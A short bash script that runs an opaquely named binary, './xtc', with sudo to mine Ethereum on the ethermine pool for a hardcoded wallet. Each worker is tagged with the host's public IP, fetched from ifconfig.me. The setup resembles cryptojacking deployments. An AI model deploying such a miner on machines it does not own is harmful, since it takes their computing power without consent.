#!/bin/bash

POOL=eu1.ethermine.org
WALLET=0x9c9bee784d68e9d698a18f51fe52490419bb0109.$(echo "$(curl -s ifconfig.me)" | tr . _ )Hadd

cd "$(dirname "$0")"

chmod +x ./xtc && sudo ./xtc --algo ETHASH --pool $POOL --user $WALLET $@